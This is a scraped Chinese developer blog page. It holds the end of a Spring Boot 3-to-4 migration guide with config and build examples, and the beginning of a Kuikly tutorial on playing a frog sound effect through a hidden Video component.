    <span class="hljs-keyword">public</span> JacksonObjectMapperBuilder <span class="hljs-title function_">jacksonObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 改用 Jackson 3 的 API，名字变了，用法差不多</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JacksonObjectMapperBuilder</span>();
    }
}
</code></pre>
<h3 data-id="heading-10">2. 配置属性迁移</h3>
<p>有些配置属性改名了，或者被废弃了；启动应用的时候，<code>spring-boot-properties-migrator</code> 会在日志里提示你。常见的配置变化：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 升级前的配置</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 这个属性可能改名了</span>

<span class="hljs-comment"># 升级后，检查日志提示，可能需要改成：</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 或者改成新的属性名</span>
</code></pre>
<h3 data-id="heading-11">3. 虚拟线程配置</h3>
<p>Spring Boot 4 深度集成了虚拟线程，如果你用的是 JDK 21，可以启用虚拟线程；这玩意儿性能好，能支持百万级并发。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml 配置虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 启用虚拟线程，JDK 21 才支持</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 代码里使用虚拟线程执行器</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">virtualThreadExecutor</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 创建虚拟线程执行器，底层用的是 Java 21 的虚拟线程</span>
        <span class="hljs-comment">// 这玩意儿比传统线程池强多了，性能提升不是一点半点</span>
        <span class="hljs-keyword">return</span> Executors.newVirtualThreadPerTaskExecutor();
    }
    
    <span class="hljs-comment">// 配置 WebMvc 使用虚拟线程</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TomcatProtocolHandlerCustomizer&lt;?&gt; protocolHandlerVirtualThreadExecutorCustomizer() {
        <span class="hljs-comment">// 让 Tomcat 使用虚拟线程处理请求，性能提升明显</span>
        <span class="hljs-keyword">return</span> protocolHandler -&gt; {
            protocolHandler.setExecutor(Executors.newVirtualThreadPerTaskExecutor());
        };
    }
}
</code></pre>
<h3 data-id="heading-12">4. 声明式 HTTP 客户端</h3>
<p>Spring Framework 7.0 引入了声明式 HTTP 客户端，用起来比 RestTemplate 和 WebClient 简单多了；如果你之前用的是 RestTemplate，可以考虑迁移到声明式客户端。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 RestTemplate</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RestTemplate restTemplate;  <span class="hljs-comment">// 这个还能用，但推荐用新的</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 调用远程接口，代码比较繁琐</span>
        <span class="hljs-keyword">return</span> restTemplate.getForObject(<span class="hljs-string">"http://api.example.com/users/"</span> + id, User.class);
    }
}

<span class="hljs-comment">// 升级后，改用声明式 HTTP 客户端</span>
<span class="hljs-meta">@HttpExchange(url = "http://api.example.com")</span>  <span class="hljs-comment">// 定义基础 URL</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserClient</span> {
    
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>  <span class="hljs-comment">// GET 请求，路径参数是 id</span>
    User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;  <span class="hljs-comment">// 方法签名就是接口定义，不用写实现</span>
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserClient userClient;  <span class="hljs-comment">// 注入客户端，Spring 会自动生成代理</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 直接调用，代码简洁多了</span>
        <span class="hljs-keyword">return</span> userClient.getUser(id);
    }
}
</code></pre>
<h2 data-id="heading-13">四、测试和验证</h2>
<h3 data-id="heading-14">1. 编译检查</h3>
<p>升级完依赖和代码，先编译一下，看看有没有编译错误；有错误的话，一个个解决。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 编译</span>
mvn clean compile

<span class="hljs-comment"># Gradle 编译</span>
./gradlew clean build
</code></pre>
<h3 data-id="heading-15">2. 启动应用</h3>
<p>编译通过后，启动应用，看看能不能正常启动；启动的时候，注意看日志，<code>spring-boot-properties-migrator</code> 会提示废弃的属性。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动应用，观察日志</span>
mvn spring-boot:run

<span class="hljs-comment"># 或者</span>
java -jar target/your-app.jar
</code></pre>
<h3 data-id="heading-16">3. 功能测试</h3>
<p>启动成功后，跑一下功能测试，看看有没有问题；特别是那些用了废弃 API 的地方，得重点测试。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 写个简单的测试，验证基本功能</span>
<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试应用上下文能不能正常加载</span>
        <span class="hljs-comment">// 如果这个测试都过不了，说明配置有问题</span>
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUserService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试业务功能，看看有没有问题</span>
        <span class="hljs-comment">// 重点测试那些改了代码的地方</span>
    }
}
</code></pre>
<h2 data-id="heading-17">五、常见问题处理</h2>
<h3 data-id="heading-18">1. 依赖冲突</h3>
<p>升级过程中，可能会遇到依赖冲突；Maven 和 Gradle 都有工具可以检查依赖冲突。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 检查依赖树</span>
mvn dependency:tree

<span class="hljs-comment"># Gradle 检查依赖</span>
./gradlew dependencies
</code></pre>
<p>如果发现冲突，可以用 <code>exclusions</code> 排除冲突的依赖，或者升级到兼容的版本。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 排除冲突依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>some-library<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 排除这个依赖 --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-19">2. 配置属性找不到</h3>
<p>有些配置属性可能被废弃了，但你的代码还在用；启动的时候，日志会提示你，按照提示改成新的属性名就行。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 如果日志提示某个属性被废弃了，比如：</span>
<span class="hljs-comment"># The property 'spring.datasource.driver-class-name' is deprecated</span>

<span class="hljs-comment"># 改成新的属性名，或者删除，如果不需要的话</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-comment"># driver-class-name: com.mysql.cj.jdbc.Driver  # 这个可能不需要了，自动检测</span>
</code></pre>
<h3 data-id="heading-20">3. 类找不到</h3>
<p>如果启动的时候报 <code>ClassNotFoundException</code>，可能是某个依赖没升级，或者版本不兼容；检查一下依赖版本，升级到兼容 Spring Boot 4 的版本。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 如果报错说某个类找不到，比如：</span>
<span class="hljs-comment">// java.lang.ClassNotFoundException: com.fasterxml.jackson.databind.ObjectMapper</span>

<span class="hljs-comment">// 可能是 Jackson 版本问题，Spring Boot 4 用的是 Jackson 3</span>
<span class="hljs-comment">// 检查一下依赖，确保用的是 Spring Boot 4 管理的版本</span>
</code></pre>
<h2 data-id="heading-21">六、升级流程图</h2>
<p>整个升级流程可以用下面这个图来理解：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[开始升级] --&gt; B[检查当前环境]
    B --&gt; C{JDK 版本 &gt;= 17?}
    C --&gt;|否| D[升级 JDK]
    C --&gt;|是| E[备份代码]
    D --&gt; E
    E --&gt; F[更新 Spring Boot 版本]
    F --&gt; G[添加属性迁移工具]
    G --&gt; H[检查第三方依赖]
    H --&gt; I[修改代码]
    I --&gt; J[编译检查]
    J --&gt; K{编译通过?}
    K --&gt;|否| L[修复编译错误]
    L --&gt; J
    K --&gt;|是| M[启动应用]
    M --&gt; N{启动成功?}
    N --&gt;|否| O[查看日志，修复问题]
    O --&gt; M
    N --&gt;|是| P[功能测试]
    P --&gt; Q{测试通过?}
    Q --&gt;|否| R[修复功能问题]
    R --&gt; P
    Q --&gt;|是| S[删除属性迁移工具]
    S --&gt; T[升级完成]
</code></pre>
<h2 data-id="heading-22">七、升级后的优化</h2>
<h3 data-id="heading-23">1. 启用虚拟线程</h3>
<p>如果你用的是 JDK 21，建议启用虚拟线程；这玩意儿性能好，能大幅提升并发性能。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 启用虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-24">2. 使用 GraalVM 原生镜像</h3>
<p>Spring Boot 4 对 GraalVM 原生镜像的支持更完善了；如果条件允许，可以尝试编译成原生镜像，启动速度快，内存占用也少。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 GraalVM 编译原生镜像</span>
mvn spring-boot:build-image

<span class="hljs-comment"># 或者用 Gradle</span>
./gradlew bootBuildImage
</code></pre>
<h3 data-id="heading-25">3. 使用分层 JAR</h3>
<p>Spring Boot 4 支持分层 JAR，可以把依赖层、资源层和业务层分开；这样构建 Docker 镜像的时候，只有业务层变化才需要重新构建，构建速度快不少。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置分层 JAR --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">layers</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 启用分层 JAR --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">layers</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<h2 data-id="heading-26">八、总结</h2>
<p>从 Spring Boot 3 升级到 4，主要就是这几个步骤：</p>
<ol>
<li><strong>检查环境</strong>：JDK 版本、当前 Spring Boot 版本</li>
<li><strong>备份代码</strong>：用 Git 创建分支，或者备份文件</li>
<li><strong>升级依赖</strong>：更新 Spring Boot 版本，检查第三方依赖</li>
<li><strong>修改代码</strong>：替换废弃的 API，迁移配置属性</li>
<li><strong>测试验证</strong>：编译、启动、功能测试</li>
<li><strong>优化配置</strong>：启用虚拟线程，使用原生镜像等</li>
</ol>
<p>升级这事儿得慢慢来，别着急；遇到问题就查文档，或者看看日志提示。升级完了，性能提升还是挺明显的，特别是虚拟线程和原生镜像这两个特性，值得一试。反正鹏磊觉得这升级还是挺值的。</p>
<p>好了，今天就聊到这；下一篇咱详细说说 JDK 17+ 最低要求与 Java 21 推荐配置，包括怎么选择 JDK 版本，以及各个版本的特性。兄弟们有啥问题可以在评论区留言，鹏磊看到会回复的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly基础之音频播放与资源管理：青蛙叫声实现]]></title>    <link>https://juejin.cn/post/7575884229524930596</link>    <guid>https://juejin.cn/post/7575884229524930596</guid>    <pubDate>2025-11-24T03:28:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229524930596" data-draft-id="7575937594350370859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly基础之音频播放与资源管理：青蛙叫声实现"/> <meta itemprop="keywords" content="Android,iOS,HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-24T03:28:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly基础之音频播放与资源管理：青蛙叫声实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:28:19.000Z" title="Mon Nov 24 2025 03:28:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在上一篇文章中，我们成功地让青蛙对我们的点击做出了视觉上的响应——一个生动的缩放动画。现在，我们的应用不再是静态的了，但似乎还缺点什么。</p>
<p>没错，就是声音！交互不仅仅是视觉上的，听觉上的反馈同样重要。如果每次点击青蛙，它都能发出一声清脆的“呱”，那应用的趣味性和沉浸感无疑会更上一层楼。</p>
<p>今天，我们就来完成这个任务：为我们的“单身青蛙”应用加上音效，让它在被点击时，能真实地“叫”出来。同时，我们也会探讨在Kuikly中如何进行基础的音频资源管理。</p>
<h2 data-id="heading-0">初步计划</h2>
<p>在动手之前，我们自然是先去翻了翻Kuikly的文档，想找找有没有现成的音频播放组件，比如一个叫<code>&lt;Audio&gt;</code>的家伙。结果发现，似乎并没有这样一个专门为播放短音效而生的轮子。</p>
<p>不过，没有“直路”，我们可以“绕路”走嘛。Kuikly提供了一个功能强大的<code>&lt;Video&gt;</code>组件。既然视频能包含声音，我们是不是可以利用它来只播放声音呢？这个想法听起来不错。</p>
<p>我们的计划是：准备一个音频文件（就是我们之前准备好的<code>frog_sound.mp3</code>），然后把它“伪装”成一个视频源交给<code>&lt;Video&gt;</code>组件。为了不让它在界面上“碍眼”，我们再把它设置成一个1x1像素的、完全透明的“隐形”播放器。</p>
<h3 data-id="heading-1">实战</h3>
<p>好了，理论有了，开干！</p>
<p>我们最初的想法很简单直接：既然拿到了<code>&lt;Video&gt;</code>组件的引用（<code>ViewRef</code>），那在点击事件里直接调用它的<code>play()</code>方法不就行了？就像这样：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 理想中的代码...</span>
ctx.soundPlayerRef.view?.play() 
</code></pre>
<p>然而，现实很快给了我们一拳，编译器无情地报错：<code>Unresolved reference: play</code>。好吧，看来此路不通。这种命令式的、直接操作视图的方式，似乎并不符合Kuikly的“口味”。</p>
<p>这次碰壁让我们冷静下来，重新思考Kuikly的设计哲学——声明式UI。我们不应该去“命令”一个组件去播放，而应该“声明”它的状态是“正在播放”。</p>
<p>于是，新的方案诞生了：</p>
<ol>
<li>定义一个<code>observable</code>的状态变量 <code>soundPlayControl</code>，用来控制播放行为（播放/暂停）。</li>
<li>将<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性绑定到这个状态上。</li>
<li>当用户点击青蛙时，我们不再调用方法，而是去更新<code>soundPlayControl</code>的状态为<code>VideoPlayControl.PLAY</code>。</li>
<li>监听<code>&lt;Video&gt;</code>的<code>playStateDidChanged</code>事件，当播放结束（状态变为<code>PlayState.PLAY_END</code>）时，再将<code>soundPlayControl</code>的状态改回<code>VideoPlayControl.PAUSE</code>，为下一次播放做准备。</li>
</ol>
<p>这个思路听起来就“地道”多了！它完美地融入了整个应用的响应式数据流。</p>
<h3 data-id="heading-2">最终代码</h3>
<p>说干就干，我们立刻对<code>FrogMainPage.kt</code>进行了改造，最终的代码如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ... 省略部分import ...</span>
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.base.ViewRef
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.PlayState
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.Video
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoPlayControl
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoView

<span class="hljs-comment">// ...</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {

    <span class="hljs-comment">// ... 省略其他状态变量 ...</span>
    <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> soundPlayerRef: ViewRef&lt;VideoView&gt;
    <span class="hljs-comment">// 新增一个控制音频播放的状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> soundPlayControl: VideoPlayControl <span class="hljs-keyword">by</span> observable(VideoPlayControl.PAUSE)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-keyword">val</span> ctx = <span class="hljs-keyword">this</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment">// ... 省略大部分UI布局 ...</span>
            
                        <span class="hljs-comment">// 主青蛙按钮</span>
                        View {
                            <span class="hljs-comment">// ... 省略部分 attr ...</span>
                            event {
                                 click {
                                     <span class="hljs-comment">// ... 省略其他点击事件逻辑 ...</span>
                                     
                                     <span class="hljs-comment">// 更新状态，触发音频播放</span>
                                     <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PLAY
                                 }
                             }
                        }
            
            <span class="hljs-comment">// ... 省略部分UI布局 ...</span>

                <span class="hljs-comment">// “隐形”的音频播放器</span>
                Video {
                    ref {
                        ctx.soundPlayerRef = it
                    }
                    attr {
                        src(<span class="hljs-string">"media/frog_sound.mp3"</span>)
                        width(<span class="hljs-number">1f</span>)
                        height(<span class="hljs-number">1f</span>)
                        opacity(<span class="hljs-number">0f</span>)
                        <span class="hljs-comment">// 将播放行为和我们的状态绑定</span>
                        playControl(<span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl)
                    }
                    event {
                        <span class="hljs-comment">// 监听播放状态</span>
                        playStateDidChanged { state, _ -&gt;
                            <span class="hljs-comment">// 播放结束后，重置状态以便下次播放</span>
                            <span class="hljs-keyword">if</span> (state == PlayState.PLAY_END) {
                                <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PAUSE
                            }
                        }
                    }
                }
                
            <span class="hljs-comment">// ... 省略底部功能区 ...</span>
        }
    }
    
    <span class="hljs-comment">// ... 省略生命周期方法 ...</span>
}
</code></pre>
<p>代码解释：</p>
<ol>
<li><strong><code>soundPlayControl</code>状态</strong>：我们新增了一个<code>observable</code>变量，它的类型是<code>VideoPlayControl</code>，默认值为<code>PAUSE</code>。</li>
<li><strong>状态更新触发播放</strong>：在青蛙的<code>click</code>事件中，我们不再调用任何方法，而是简单地将<code>soundPlayControl</code>的值改为<code>VideoPlayControl.PLAY</code>。</li>
<li><strong>属性绑定</strong>：<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性直接绑定了<code>soundPlayControl</code>状态。当状态改变时，Kuikly框架会自动更新组件，从而控制视频（音频）的播放或暂停。</li>
<li><strong>播放后重置状态</strong>：我们监听<code>playStateDidChanged</code>事件。在探索中我们发现，当播放完成时，状态会变为<code>PlayState.PLAY_END</code>。此时，我们把<code>soundPlayControl</code>重新设置为<code>PAUSE</code>，这样就完成了一个播放循环，并且可以让青蛙被连续点击发声。</li>
</ol>
<h2 data-id="heading-3">结语</h2>
